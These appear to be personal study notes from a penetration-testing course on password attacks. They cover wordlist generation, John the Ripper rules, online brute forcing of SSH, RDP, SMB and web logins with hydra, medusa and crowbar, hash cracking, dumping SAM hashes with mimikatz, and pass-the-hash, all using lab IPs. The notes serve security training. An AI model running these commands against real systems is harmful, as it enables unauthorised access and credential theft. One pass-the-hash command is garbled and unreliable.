In general many pws under `/usr/share/worklists/`
# commond passwords available in kali
/usr/share/worklists/rockyou.txt

## unzip with
gunzip /usr/share/worklists/rockyou.txt.gz

# dictionary attack
* geneate wordlist by studying website, creates a file which contains works greater than six chars (-m6): `cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt`
* using John the Ripper to mutate the wordlist: `sudo nano /etc/john/john.conf`
We might just add a unique rule for JTR (see adding following text in code): 
```
# Wordlist mode rules
[List.Rules:Wordlist]
# Try words as they are
:
# Lowercase every pure alphanumeric word
-c >3 !?X l Q
# Capitalize every pure alphanumeric word
-c (?a >2 !?X c Q
# Lowercase and pluralize pure alphabetic words
...
# Try the second half of split passwords
-s x_
-s-c x_ M l Q
# [Adding following:]Add two numbers to the end of each password
$[0-9]$[0-9]
```
* run to mutate the list: `john --wordlist=bigTree-cewl.txt --rules --stdout > mutated.txt` 

# Bruteforce wordlists (if you have a specific pw policy)
In contrast to a dictionary attack, a brute force password attack calculates and tests every possible
character combination that could make up a password until the correct one is found

* for example pw policy: `[Capital Letter][2 x lower case letters] [2 x special chars][3 x numeric]`
* check manual for crunch `man crunch` then we might generate random pws with: `crunch 8 8 -t ,@@^^%%%` => will exatly generate as described above
Placeholder Character Translation
```
@ => Lower case alpha characters
, => Upper case alpha characters
% => Numeric characters
^ => Special characters including space
```
* `crunch 4 6 0123456789ABCDEF -o crunch.txt` => create pws with length 4 to 6 with allowed chars "01...EF"

# Bruteforcing different protocolls
`medusa -d` to check with protocols can be bruteforced

## http baseAuth with username and pw
`medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin`

## smb
`medusa -h 192.168.174.10 -u admin -P /usr/share/wordlists/rockyou.txt -M smbnt`

## rdp - Remote Desktop Protocol Attack (windows) with Crowbar
Crowbar, formally known as Levye, is a network authentication cracking tool primarily designed to
leverage SSH keys rather than passwords. It is also one of the few tools that can reliably and
efficiently perform password attacks against the Windows Remote Desktop Protocol (RDP) service
on modern versions of Windows.

To invoke crowbar , we will specify the protocol ( -b ), the target server ( -s ), a username ( -u ), a
wordlist ( -C ), and the number of threads ( -n ) => *rdp just support one thread*
`crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1`

## SSH Attack with THC-Hydra
//using username “root” with a password list on ssh with 4 parallel tasks and verbose
`hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.0.13:22 -t 4 -V`
or: `hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1`

## HTTP POST Attack with THC-Hydra
As an additional example, we will perform an HTTP POST attack against our Windows Apache
server using Hydra. When a HTTP POST request is used for user login, it is most often through the
use of a web form, which means we should use the “http-form-post” service module
`hydra http-form-post -U`

The complete command can now be executed. We will supply the admin user name ( `-l admin` )
and wordlist ( `-P` ), request verbose output with `-vV` , and use `-f` to stop the attack when the first
successful result is found. In addition, we will supply the service module name ( `http-form-post` )
and its required arguments ( `“/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN”` )
`hydra 192.168.174.10 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f`

# Hashes

## Identifying hashes
`hashid c43ee559d69bc7f691fe2fbfe8a5ef0a`
Generates:
Analyzing 'c43ee559d69bc7f691fe2fbfe8a5ef0a'
[+] MD2

## Decrypt hashes

Example: cracking md5 (0 => md5) -a attackmode
`hashcat -m 0 -a 0 "5f4dcc3b5aa765d61d8327deb882cf99"`

OR add `--force` run with CPU instead of GPU; 0 => md5
`hashcat -m 0 md5hash.txt /home/kali/Documents/rockyou.txt --force`


# Windows

Oder versions of windows use LAN Manager (splitted up passwords, made them upper case) and it is known to be very weak since passwords. From Windows Vista on, the operating system disables *LM by default* and uses *NTLM*.
NTLM hashes are stored in the SAM database but are still not salted. 

To deter offline SAM database password attacks, Microsoft introduced the SYSKEY feature (Windows NT 4.0 SP3), which partially encrypts the SAM file.
It’s worth mentioning that the SAM database cannot be copied while the operating system is running because the Windows kernel keeps an exclusive file system lock on the file, but we can use minikatz:

## Using mimikatz to dump the password hashes from the SAM database on your Windows

* Start it `C:\Tools\password_attacks\mimikatz.exe` => needs to be started with admin
* `privilege::debug` && `token::elevate` => check permission should return OK, enables the SeDebugPrivilge access right required to tamper with another process. If this commands fails, mimikatz was most likely not executed with administrative privileges.
* Now we can use `lsadump::sam` to dump the contents of the SAM database, output like this and we get the hash pw of the user
```
RID  : 000003ea (1002)
User : student
  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
    ...
```

Other hash dumping tools, including pwdump, fgdump, 577 and Windows
Credential Editor (wce) 578 work well against older Windows operating systems
like Windows XP and Windows Server 2003.

## Passing the Hash in Windows
Checking hashes for PWs can be very time consuming. But The Pass-the-Hash (PtH) technique (discovered in 1997) allows an attacker to authenticate to a remote target by using a valid combination of username and NTLM/LM hash rather than a clear text password. This is possible because NTLM/LM password hashes are not salted and remain static between sessions. Moreover, if we discover a password hash on one target, we cannot only use it to authenticate to that target, we can use it to authenticate to another target as well.

* Performing authentication using the SMB protocol: 
offsec is the user name, `aaad3...` `289...`is the hashed pw of the user. offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd`

# Password cracking
If a salt is involved in the authentication process and we do not know what that salt value is, cracking could become extremely complex, if not impossible, as we must repeatedly hash each potential clear text password with various salts. But usally the salt is store in databases.

* to bruteforce file (windows hashes), file containing the hash `sudo john hash.txt --format=NT`
* to bruteforce with special worklist: `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT`

## linux
In order to crack Linux-based hashes with JTR, we will need to first use the unshadow utility to combine the passwd and shadow files from the compromised system.
* `unshadow passwd-file.txt shadow-file.txt`, then `unshadow passwd-file.txt shadow-file.txt > unshadowed.txt`
* `john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt`

## hascat for faster cracking (via gpu)
see (cyptro.md)